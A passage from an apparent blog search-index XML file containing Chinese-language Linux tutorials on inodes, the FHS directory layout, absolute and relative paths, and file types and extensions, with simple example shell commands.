就相当于这本书前面的目录，一本书有很多的内容，如果想查找某部份的内容，我们可以先查目录，通过目录能最快的找到我们想要看的内容。虽然不太恰当，但还是比较形象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当我们用ls 查看某个目录或文件时，如果加上-i 参数，就可以看到inode节点了；比如我们前面所说的例子： 12[root@localhost test]# ls -li log2012.log 2095112 -rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;log2012.log 的inode值是 2095112 ； 查看一个文件或目录的inode，要通过ls 命令的的 -i参数。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 目录结构]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F23.%20Linux%20%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[Linux 目录结构&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于每一个Linux学习者来说，了解Linux文件系统的目录结构，是学好Linux的至关重要的一步.，深入了解linux文件目录结构的标准和每个目录的详细功能，对于我们用好linux系统只管重要，下面我们就开始了解一下linux目录结构的相关知识。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当在使用Linux的时候，如果您通过ls –l / 就会发现，在/下包涵很多的目录，比如etc、usr、var、bin … … 等目录，而在这些目录中，我们进去看看，发现也有很多的目录或文件。文件系统在Linux下看上去就象树形结构，所以我们可以把文件系统的结构形象的称为 树形结构。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件系统的是用来组织和排列文件存取的，所以她是可见的，在Linux中，我们可以通过ls等工具来查看其结构，在Linux系统中，我们见到的都是树形结构；比如操作系统安装在一个文件系统中，他表现为由/ 起始的树形结构。linux文件系统的最顶端是/，我们称/为Linux的root，也就是 Linux操作系统的文件系统。Linux的文件系统的入口就是/，所有的目录、文件、设备都在/之下，/就是Linux文件系统的组织者，也是最上级的领导者。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于linux是开放源代码，各大公司和团体根据linux的核心代码做各自的操作，编程。这样就造成在根下的目录的不同。这样就造成个人不能使用他人的linux系统的PC。因为你根本不知道一些基本的配置，文件在哪里。。。这就造成了混乱。这就是FHS（Filesystem Hierarchy Standard ）机构诞生的原因。该机构是linux爱好者自发的组成的一个团体，主要是是对linux做一些基本的要求，不至于是操作者换一台主机就成了linux的‘文盲’。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据FHS的官方文件指出， 他们的主要目的是希望让使用者可以了解到已安装软件通常放置于那个目录下， 所以他们希望独立的软件开发商、操作系统制作者、以及想要维护系统的用户，都能够遵循FHS的标准。 也就是说，FHS的重点在于规范每个特定的目录下应该要放置什么样子的数据而已。 这样做好处非常多，因为Linux操作系统就能够在既有的面貌下(目录架构不变)发展出开发者想要的独特风格。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事实上，FHS是根据过去的经验一直再持续的改版的，FHS依据文件系统使用的频繁与否与是否允许使用者随意更动， 而将目录定义成为四种交互作用的形态，用表格来说有点像底下这样： &#160; 可分享的（shareable） 不可分享的（unshareables） 不变的（static） /usr(软件放置处） /etc（配置文件） &#160; /opt(第三方协力软件) /boot（开机与核心档） 可变动的（variable） /var/mail（使用者邮件信箱） /var/run（程序相关） &#160; /var/spool/news（新闻组） /var/lock（程序相关） 四种类型1.可分享的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以分享给其他系统挂载的目录，所以包括执行文件与用户的邮件等数据，是能够分享给网络上其他主机挂载用的目录； 2.不可分享的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;自己机器上面运作的装置文件或者是与程序有关的 socket 文件等，由于仅与自身机器有关，所以当然就不合适分享给其他主机了。 3.不变的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些数据是不回经常变动的，跟随着 distribution 而不变动。例如函式库、文件说明文件、系统管理员所管理的主机服务配置文件等等； 4.可变动的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经常改变的数据，例如登录文件、一般用户可自行收受的新闻组等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事实上，FHS 针对目录树架构仅定义出三层目录底下应该放置什么数据而已，分别是底下这三个目录的定义： / (root, 根目录)：与开机系统有关；/usr (unix software resource)：与软件安装/执行有关；/var (variable)：与系统运作过程有关。一、根目录（/）的意义与内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的， 同时根目录也与开机/还原/系统修复等动作有关。 由于系统开机时需要特定的开机软件、核心文件、开机所需程序、 函式库等等文件数据，若系统出现错误时，根目录也必须要包含有能够修复文件系统的程序才行。 因为根目录是这么的重要，所以在FHS的要求方面，他希望根目录不要放在非常大的分区， 因为越大的分区内你会放入越多的数据，如此一来根目录所在分区就可能会有较多发生错误的机会。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此FHS标准建议：根目录(/)所在分区应该越小越好， 且应用程序所安装的软件最好不要与根目录放在同一个分区内，保持根目录越小越好。 如此不但效能较佳，根目录所在的文件系统也较不容易发生问题。说白了，就是根目录和Windows的C盘一个样。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据以上原因，FHS认为根目录(/)下应该包含如下子目录： 目录 应防止档案内容 /bin 系统有很多放置执行档的目录，但/bin比较特殊。因为/bin放置的是在单人维护模式下还能够被操作的指令。在/bin底下的指令可以被root与一般帐号所使用，主要有：cat,chmod(修改权限), chown, date, mv, mkdir, cp, bash等等常用的指令。 /boot 主要放置开机会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。Linux kernel常用的档名为：vmlinuz ，如果使用的是grub这个开机管理程式，则还会存在/boot/grub/这个目录。 /dev 在Linux系统上，任何装置与周边设备都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有/dev/null, /dev/zero, /dev/tty , /dev/lp, / dev/hd, /dev/sd*等等 /etc 系统主要的设定档几乎都放置在这个目录内，例如人员的帐号密码档、各种服务的启始档等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，但是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有：/etc/inittab, /etc/init.d/, /etc/modprobe.conf, /etc/X11/, /etc/fstab, /etc/sysconfig/等等。 另外，其下重要的目录有：/etc/init.d/ ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话： /etc/init.d/iptables start、/etc/init.d/ iptables stop/etc/xinetd.d/ ：这就是所谓的super daemon管理的各项服务的设定档目录。/etc/X11/ ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。 /home 这是系统预设的使用者家目录(home directory)。 在你新增一个一般使用者帐号时，预设的使用者家目录都会规范到这里来。比较重要的是，家目录有两种代号： ~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录。 /lib 系统的函式库非常的多，而/lib放置的则是在开机时会用到的函式库，以及在/bin或/sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？妳可以将他想成是外挂，某些指令必须要有这些外挂才能够顺利完成程式的执行之意。 尤其重要的是/lib/modules/这个目录，因为该目录会放置核心相关的模组(驱动程式)。 /media media是媒体的英文，顾名思义，这个/media底下放置的就是可移除的装置。 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：/media/floppy, /media/cdrom等等。 /mnt 如果妳想要暂时挂载某些额外的装置，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与/media相同啦。 只是有了/media之后，这个目录就用来暂时挂载用了。 /opt 这个是给第三方协力软体放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果妳想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，以前的Linux系统中，我们还是习惯放置在/usr/local目录下。 /root 系统管理员(root)的家目录。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。 /sbin Linux有非常多指令是用来设定系统环境的，这些指令只有root才能够利用来设定系统，其他使用者最多只能用来查询而已。放在/sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所需要的指令。至于某些伺服器软体程式，一般则放置到/usr/sbin/当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到/usr/local/sbin/当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。 /srv srv可以视为service的缩写，是一些网路服务启动之后，这些服务所需要取用的资料目录。 常见的服务例如WWW, FTP等等。 举例来说，WWW伺服器需要的网页资料就可以放置在/srv/www/里面。呵呵，看来平时我们编写的代码应该放到这里了。 /tmp 这是让一般使用者或者是正在执行的程序暂时放置档案的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊。 因为FHS甚至建议在开机时，应该要将/tmp下的资料都删除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事实上 FHS 针对根目录所定义的标准就仅限于上表，不过仍旧有些目录也需要了解，具体如下： 目录 应放置文件内容 /lost + found 这个目录是使用标准的ext2/ext3档案系统格式才会产生的一个目录，目的在于当档案系统发生错误时，将一些遗失的片段放置到这个目录下。 这个目录通常会在分割槽的最顶层存在，例如你加装一个硬盘于/disk中，那在这个系统下就会自动产生一个这样的目录/disk/lost+found /proc 这个目录本身是一个虚拟文件系统(virtual filesystem)喔。 他放置的资料都是在内存当中，例如系统核心、行程资讯(process)（是进程吗?）、周边装置的状态及网络状态等等。因为这个目录下的资料都是在记忆体（内存）当中，所以本身不占任何硬盘空间。比较重要的档案（目录）例如： /proc/cpuinfo, /proc/dma, /proc/interrupts, /proc/ioports, /proc/net/*等等。呵呵，是虚拟内存吗[guest]？ /sys 这个目录其实跟/proc非常类似，也是一个虚拟的档案系统，主要也是记录与核心相关的资讯。 包括目前已载入的核心模组与核心侦测到的硬体装置资讯等等。 这个目录同样不占硬盘容量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了这些目录的内容文件，另外要注意的是，因为根目录与开机有关，开机过程中仅有根目录会被挂载，其他分区则是在开机完成之后才会持续的进行挂载的行为。就是因为如此，因此根目录下与开机过程有关的目录，就不能够与根目录放到不同的分区去。哪些目录不可与根分区分开呢： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc：配置文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/bin：重要执行档 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/dev：所需要的装置文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/lib：执行档所需的函式库与核心所需的模块 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/sbin：重要的系统执行文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这五个目录千万不可与根目录分开在不同的分区。 二、/usr 的意义与内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;依据FHS的基本定义，/usr里面放置的数据属于可分享的与不可变动的(shareable, static)， 如果你知道如何透过网络进行分区的挂载(例如在服务器篇会谈到的NFS服务器)，那么/usr确实可以分享给局域网络内的其他主机来使用喔。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/usr不是user的缩写，其实usr是Unix Software Resource的缩写， 也就是Unix操作系统软件资源所放置的目录，而不是用户的数据啦。这点要注意。 FHS建议所有软件开发者，应该将他们的数据合理的分别放置到这个目录下的次目录，而不要自行建立该软件自己独立的目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为是所有系统默认的软件(distribution发布者提供的软件)都会放置到/usr底下，因此这个目录有点类似Windows 系统的C:\Windows\ + C:\Program files\这两个目录的综合体，系统刚安装完毕时，这个目录会占用最多的硬盘容量。 一般来说，/usr的次目录建议有底下这些： 目录 应放置文件内容 /usr/X11R6/ 为X Window System重要数据所放置的目录，之所以取名为X11R6是因为最后的X版本为第11版，且该版的第6次释出之意。 /usr/bin/ 绝大部分的用户可使用指令都放在这里。请注意到他与/bin的不同之处。(是否与开机过程有关) /usr/include/ c/c++等程序语言的档头(header)与包含档(include)放置处，当我们以tarball方式 (*.tar.gz 的方式安装软件)安装某些数据时，会使用到里头的许多包含档。 /usr/lib/ 包含各应用软件的函式库、目标文件(object file)，以及不被一般使用者惯用的执行档或脚本(script)。 某些软件会提供一些特殊的指令来进行服务器的设定，这些指令也不会经常被系统管理员操作， 那就会被摆放到这个目录下啦。要注意的是，如果你使用的是X86_64的Linux系统， 那可能会有/usr/lib64/目录产生 /usr/local/ 统管理员在本机自行安装自己下载的软件(非distribution默认提供者)，建议安装到此目录， 这样会比较便于管理。举例来说，你的distribution提供的软件较旧，你想安装较新的软件但又不想移除旧版， 此时你可以将新版软件安装于/usr/local/目录下，可与原先的旧版软件有分别啦。 你可以自行到/usr/local去看看，该目录下也是具有bin, etc, include, lib…的次目录 /usr/sbin/ 非系统正常运作所需要的系统指令。最常见的就是某些网络服务器软件的服务指令(daemon) /usr/share/ 放置共享文件的地方，在这个目录下放置的数据几乎是不分硬件架构均可读取的数据， 因为几乎都是文本文件嘛。在此目录下常见的还有这些次目录：/usr/share/man：联机帮助文件;/usr/share/doc：软件杂项的文件说明;/usr/share/zoneinfo：与时区有关的时区文件 /usr/src/ 一般原始码建议放置到这里，src有source的意思。至于核心原始码则建议放置到/usr/src/linux/目录下。 三、/var 的意义与内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果/usr是安装时会占用较大硬盘容量的目录，那么/var就是在系统运作后才会渐渐占用硬盘容量的目录。 因为/var目录主要针对常态性变动的文件，包括缓存(cache)、登录档(log file)以及某些软件运作所产生的文件， 包括程序文件(lock file, run file)，或者例如MySQL数据库的文件等等。常见的次目录有： 目录 应放置文件内容 /var/cache/ 应用程序本身运作过程中会产生的一些暂存档 /var/lib/ 程序本身执行的过程中，需要使用到的数据文件放置的目录。在此目录下各自的软件应该要有各自的目录。 举例来说，MySQL的数据库放置到/var/lib/mysql/而rpm的数据库则放到/var/lib/rpm去 /var/lock/ 某些装置或者是文件资源一次只能被一个应用程序所使用，如果同时有两个程序使用该装置时， 就可能产生一些错误的状况，因此就得要将该装置上锁(lock)，以确保该装置只会给单一软件所使用。 举例来说，刻录机正在刻录一块光盘，你想一下，会不会有两个人同时在使用一个刻录机烧片？ 如果两个人同时刻录，那片子写入的是谁的数据？所以当第一个人在刻录时该刻录机就会被上锁， 第二个人就得要该装置被解除锁定(就是前一个人用完了)才能够继续使用 /var/log/ 非常重要。这是登录文件放置的目录。里面比较重要的文件如/var/log/messages, /var/log/wtmp(记录登入者的信息)等。 /var/mail/ 放置个人电子邮件信箱的目录，不过这个目录也被放置到/var/spool/mail/目录中，通常这两个目录是互为链接文件。 /var/run/ 某些程序或者是服务启动后，会将他们的PID放置在这个目录下 /var/spool/ 这个目录通常放置一些队列数据，所谓的“队列”就是排队等待其他程序使用的数据。 这些数据被使用后通常都会被删除。举例来说，系统收到新信会放置到/var/spool/mail/中， 但使用者收下该信件后该封信原则上就会被删除。信件如果暂时寄不出去会被放到/var/spool/mqueue/中， 等到被送出后就被删除。如果是工作排程数据(crontab)，就会被放置到/var/spool/cron/目录中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于 FHS 仅是定义出最上层(/)及次层(/usr, /var)的目录内容应该要放置的文件或目录数据， 因此，在其他次目录层级内，就可以随开发者自行来配置了。 四、目录树（directory tree）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux底下，所有的文件与目录都是由根目录开始的。那是所有目录与文件的源头, 然后再一个一个的分支下来，因此，我们也称这种目录配置方式为：目录树(directory tree), 这个目录树的主要特性有： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目录树的启始点为根目录 (/, root)； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一个目录不止能使用本地端的 partition 的文件系统，也可以使用网络上的 filesystem 。举例来说， 可以利用 Network File System (NFS) 服务器挂载某特定目录等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一个文件在此目录树中的文件名(包含完整路径)都是独一无二的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果我们将整个目录树以图的方法来显示，并且将较为重要的文件数据列出来的话，那么目录树架构就如下图所示： 五、绝对路径与相对路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了需要特别注意的FHS目录配置外，在文件名部分我们也要特别注意。因为根据档名写法的不同，也可将所谓的路径(path)定义为绝对路径(absolute)与相对路径(relative)。 这两种文件名/路径的写法依据是这样的： 绝对路径：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由根目录(/)开始写起的文件名或目录名称， 例如 /home/dmtsai/.bashrc； 相对路径：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相对于目前路径的文件名写法。 例如 ./home/dmtsai 或 http://www.cnblogs.com/home/dmtsai/ 等等。反正开头不是 / 就属于相对路径的写法 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而你必须要了解，相对路径是以你当前所在路径的相对位置来表示的。举例来说，你目前在 /home 这个目录下， 如果想要进入 /var/log 这个目录时，可以怎么写呢？ 12cd /var/log (absolute)cd ../var/log (relative) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为你在 /home 底下，所以要回到上一层 (../) 之后，才能继续往 /var 来移动的，特别注意这两个特殊的目录： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;. ：代表当前的目录，也可以使用 ./ 来表示； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.. ：代表上一层目录，也可以 ../ 来代表。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个 . 与 .. 目录概念是很重要的，你常常会看到 cd .. 或 ./command 之类的指令下达方式， 就是代表上一层与目前所在目录的工作状态。 使用实例实例1：如何先进入/var/spool/mail/目录，再进入到/var/spool/cron/目录内？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 12cd /var/spool/mailcd ../cron &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于/var/spool/mail与/var/spool/cron是同样在/var/spool/目录中。如此就不需要在由根目录开始写起了。这个相对路径是非常有帮助的，尤其对于某些软件开发商来说。 一般来说，软件开发商会将数据放置到/usr/local/里面的各相对目录。 但如果用户想要安装到不同目录呢？就得要使用相对路径。 实例2：网络文件常常提到类似./run.sh之类的数据，这个指令的意义为何？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于指令的执行需要变量的支持，若你的执行文件放置在本目录，并且本目录并非正规的执行文件目录(/bin, /usr/bin等为正规)，此时要执行指令就得要严格指定该执行档。./代表本目录的意思，所以./run.sh代表执行本目录下， 名为run.sh的文件。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件类型与扩展名]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F24.%20Linux%20%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8E%E6%89%A9%E5%B1%95%E5%90%8D%2F</url>
    <content type="text"><![CDATA[Linux 文件类型与扩展名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux文件类型和Linux文件的文件名所代表的意义是两个不同的概念。我们通过一般应用程序而创建的比如file.txt、file.tar.gz ，这些文件虽然要用不同的程序来打开，但放在Linux文件类型中衡量的话，大多是常规文件（也被称为普通文件）。 一、文件类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux文件类型常见的有：普通文件、目录文件、字符设备文件和块设备文件、符号链接文件等，现在我们进行一个简要的说明。 1.普通文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们用 ls -lh 来查看某个文件的属性，可以看到有类似-rwxrwxrwx，值得注意的是第一个符号是 - ，这样的文件在Linux中就是普通文件。这些文件一般是用一些相关的应用程序创建，比如图像工具、文档工具、归档工具… …. 或 cp工具等。这类文件的删除方式是用rm 命令。 另外，依照文件的内容，又大略可以分为： 纯文本档（ASCII）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是Linux系统中最多的一种文件类型，称为纯文本档是因为内容为我们人类可以直接读到的数据，例如数字、字母等等。 几乎只要我们可以用来做为设定的文件都属于这一种文件类型。 举例来说，你可以用命令： cat ~/.bashrc 来看到该文件的内容。 (cat 是将一个文件内容读出来的指令). 二进制文件（binary）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统其实仅认识且可以执行二进制文件(binary file)。Linux当中的可执行文件(scripts, 文字型批处理文件不算)就是这种格式的文件。 刚刚使用的命令cat就是一个binary file。 数据格式化文件（data）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些程序在运作的过程当中会读取某些特定格式的文件，那些特定格式的文件可以被称为数据文件 (data file)。举例来说，我们的Linux在使用者登录时，都会将登录的数据记录在 /var/log/wtmp那个文件内，该文件是一个data file，他能够透过last这个指令读出来！ 但是使用cat时，会读出乱码～因为他是属于一种特殊格式的文件？ 2.目录文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当我们在某个目录下执行，看到有类似 drwxr-xr-x ，这样的文件就是目录，目录在Linux是一个比较特殊的文件。注意它的第一个字符是d。创建目录的命令可以用 mkdir 命令，或cp命令，cp可以把一个目录复制为另一个目录。删除用rm 或rmdir命令。 3.字符设备或块设备文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如时您进入/dev目录，列一下文件，会看到类似如下的: 1234[root@localhost ~]# ls -al /dev/ttycrw-rw-rw- 1 root tty 5, 0 11-03 15:11 /dev/tty[root@localhost ~]# ls -la /dev/sda1brw-r----- 1 root disk 8, 1 11-03 07:11 /dev/sda1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们看到/dev/tty的属性是 crw-rw-rw- ，注意前面第一个字符是 c ，这表示字符设备文件。比如猫等串口设备。我们看到 /dev/sda1 的属性是 brw-r—– ，注意前面的第一个字符是b，这表示块设备，比如硬盘，光驱等设备。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个种类的文件，是用mknode来创建，用rm来删除。目前在最新的Linux发行版本中，我们一般不用自己来创建设备文件。因为这些文件是和内核相关联的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;与系统周边及储存等相关的一些文件， 通常都集中在/dev这个目录之下！通常又分为两种： 区块（block）设备档&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就是一些储存数据， 以提供系统随机存取的接口设备，举例来说，硬盘与软盘等就是啦！ 你可以随机的在硬盘的不同区块读写，这种装置就是成组设备！你可以自行查一下/dev/sda看看， 会发现第一个属性为[ b ]！ 字符（character）设备文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;亦即是一些串行端口的接口设备， 例如键盘、鼠标等等！这些设备的特色就是一次性读取的，不能够截断输出。 举例来说，你不可能让鼠标跳到另一个画面，而是滑动到另一个地方！第一个属性为 [ c ]。 4.数据接口文件（sockets）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据接口文件（或者：套接口文件），这种类型的文件通常被用在网络上的数据承接了。我们可以启动一个程序来监听客户端的要求， 而客户端就可以透过这个socket来进行数据的沟通了。第一个属性为 [ s ]， 最常在/var/run这个目录中看到这种文件类型了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：当我们启动MySQL服务器时，会产生一个mysql.sock的文件。 12[root@localhost ~]# ls -lh /var/lib/mysql/mysql.sock srwxrwxrwx 1 mysql mysql 0 04-19 11:12 /var/lib/mysql/mysql.sock &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意这个文件的属性的第一个字符是 s。 5.符号连接文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当我们查看文件属性时，会看到有类似 lrwxrwxrwx,注意第一个字符是l，这类文件是链接文件。是通过ln -s 源文件名 新文件名 。上面是一个例子，表示setup.log是install.log的软链接文件。怎么理解呢？这和Windows操作系统中的快捷方式有点相似。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;符号链接文件的创建方法举例: 123456[root@localhost test]# ls -lh log2012.log-rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log[root@localhost test]# ln -s log2012.log linklog.log[root@localhost test]# ls -lh *.loglrwxrwxrwx 1 root root 11 11-22 06:58 linklog.log -&gt; log2012.log-rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log 6.数据传输文件（FIFO，pipe）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FIFO也是一种特殊的文件类型，他主要的目的在解决多个程序同时存取一个文件所造成的错误问题。 FIFO是first-in-first-out的缩写。第一个属性为[p] 。 二、Linux 文件扩展名1.扩展名类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本上，Linux的文件是没有所谓的扩展名的，一个Linux文件能不能被执行，与他的第一栏的十个属性有关， 与档名根本一点关系也没有。这个观念跟Windows的情况不相同喔！在Windows底下， 能被执行的文件扩展名通常是 .com .exe .bat等等，而在Linux底下，只要你的权限当中具有x的话，例如[ -rwx-r-xr-x ] 即代表这个文件可以被执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过，可以被执行跟可以执行成功是不一样的～举例来说，在root家目录下的install.log 是一个纯文本档，如果经由修改权限成为 -rwxrwxrwx 后，这个文件能够真的执行成功吗？ 当然不行～因为他的内容根本就没有可以执行的数据。所以说，这个x代表这个文件具有可执行的能力， 但是能不能执行成功，当然就得要看该文件的内容. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虽然如此，不过我们仍然希望可以藉由扩展名来了解该文件是什么东西，所以，通常我们还是会以适当的扩展名来表示该文件是什么种类的。底下有数种常用的扩展名： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*.sh ： 脚本或批处理文件 (scripts)，因为批处理文件为使用shell写成的，所以扩展名就编成 .sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Z, .tar, .tar.gz, .zip, *.tgz： 经过打包的压缩文件。这是因为压缩软件分别为 gunzip, tar 等等的，由于不同的压缩软件，而取其相关的扩展名！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.html, .php：网页相关文件，分别代表 HTML 语法与 PHP 语法的网页文件。 .html 的文件可使用网页浏览器来直接开启，至于 .php 的文件， 则可以透过 client 端的浏览器来 server 端浏览，以得到运算后的网页结果。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本上，Linux系统上的文件名真的只是让你了解该文件可能的用途而已，真正的执行与否仍然需要权限的规范才行。例如虽然有一个文件为可执行文件，如常见的/bin/ls这个显示文件属性的指令，不过，如果这个文件的权限被修改成无法执行时，那么ls就变成不能执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上述的这种问题最常发生在文件传送的过程中。例如你在网络上下载一个可执行文件，但是偏偏在你的 Linux系统中就是无法执行！呵呵！那么就是可能文件的属性被改变了。不要怀疑，从网络上传送到你的 Linux系统中，文件的属性与权限确实是会被改变的。 2.Linux 文件名长度限制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux底下，使用预设的Ext2/Ext3文件系统时，针对文件名长度限制为： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;单一文件或目录的最大容许文件名为 255 个字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;包含完整路径名称及目录 (/) 之完整档名为 4096 个字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是相当长的档名！我们希望Linux的文件名可以一看就知道该文件在干嘛的， 所以档名通常是很长很长。 3.Linux 文件名的字符的限制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于Linux在文字接口下的一些指令操作关系，一般来说，你在设定Linux底下的文件名时， 最好可以避免一些特殊字符比较好！例如底下这些： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;* ? &gt; &lt; ; &amp; ! [ ] | \ ‘ “ ` ( ) { } &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为这些符号在文字接口下，是有特殊意义的。另外，文件名的开头为小数点“.”时， 代表这个文件为隐藏文件！同时，由于指令下达当中，常常会使用到 -option 之类的选项， 所以你最好也避免将文件档名的开头以 - 或 + 来命名。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- chown]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F30.%20Linux%20%E5%91%BD%E4%BB%A4-%20chown%2F</url>
